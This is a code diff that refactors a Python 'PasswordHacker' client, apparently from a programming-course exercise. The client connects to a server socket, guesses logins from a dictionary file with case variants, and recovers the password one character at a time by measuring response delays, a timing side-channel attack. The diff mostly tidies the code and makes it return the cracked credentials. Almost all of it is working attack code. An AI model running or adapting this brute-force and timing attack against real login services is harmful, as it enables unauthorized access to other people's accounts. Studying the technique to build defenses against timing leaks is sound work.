@@ -13,23 +13,22 @@ class PasswordHacker:
         self.port = port
         self.client_socket = socket.socket()
         self.dict_file = "hacking/logins.txt"
-
-
-
+        self.login = None
+        self.credentials = None
 
     def connect_to_server(self):
         self.client_socket.connect((self.ip_address, self.port))  # connect takes the tuple as an argument
 
     def abort_connection(self):
         self.client_socket.close()  # closing connection
+        self.logs_file.close()
 
     @staticmethod
     def password_generator(output_length=1000000) -> str:
         possible_symbols = string.ascii_letters + string.digits
         for i in range(output_length):
-            for message in product(possible_symbols, repeat=i+1):
+            for message in product(possible_symbols, repeat=i + 1):
                 yield "".join(message)
-
 
     def brute_force(self):  # client_socket
         generator = PasswordHacker.password_generator()
@@ -51,13 +50,11 @@ class PasswordHacker:
         else:
             yield _password
 
-
     def send_and_recv_json_request(self, message) -> str:
         self.client_socket.send(message.encode())
         return self.client_socket.recv(1024).decode()
 
-
-    def try_dictionary_password(self,_dict_file, _client_socket):
+    def try_dictionary_password(self, _dict_file, _client_socket):
         password_pool = tuple(open(_dict_file).read().split('\n'))
         for password in password_pool:
             for password_variant in self.case_generator(password):
@@ -65,7 +62,6 @@ class PasswordHacker:
                 if response == "Connection success!":
                     print(password_variant)
                     exit()
-
 
     def hack_login(self):
         # find login first, then find password, then send request
@@ -87,12 +83,11 @@ class PasswordHacker:
                     # login_variant will be correct login at this step
                     return login_variant
 
-
-    def hack_password(self, login, password_beginning=""):
+    def hack_password(self, password_beginning=""):
         for password in self.password_generator(output_length=1):
             if password_beginning:
                 password = password_beginning + password
-            message = {"login": login, "password": password}
+            message = {"login": self.login, "password": password}
             # reading response from server
             start = time()
             response = self.send_and_recv_json_request(json.dumps(message))
@@ -101,16 +96,14 @@ class PasswordHacker:
             self.logs_file.write(f"result :{json.loads(response)['result']}  {processing_time}\n")
 
             if json.loads(response)["result"] == "Wrong password!" and processing_time > 90000:
-                return self.hack_password(login, password_beginning=password)
+                return self.hack_password(password_beginning=password)
             if json.loads(response)["result"] == "Connection success!":
-                print(json.dumps(message))
-                exit()
-
+                self.credentials = json.dumps(message)
+                return self.credentials
 
 
 def main():
     args = sys.argv
-
     if len(args) < 3:
         print("Not enough arguments. Please provide : ip_address, port, message")
         exit()
@@ -118,19 +111,15 @@ def main():
     hacking_target = PasswordHacker(ip_address=args[1], port=int(args[2]))
     hacking_target.connect_to_server()
 
-
-    login = hacking_target.hack_login()
-    if not login:
+    hacking_target.login = hacking_target.hack_login()
+    if not hacking_target.login:
         print("sorry, no more logins in DB file")
     else:
-        hacking_target.hack_password(login)
+        hacking_target.credentials = hacking_target.hack_password()
+        print(hacking_target.credentials)
 
     hacking_target.abort_connection()
-    hacking_target.logs_file.close()
 
 
 if __name__ == '__main__':
-    client_socket = ''
     main()
-
-# (final - start).microseconds >= 90000
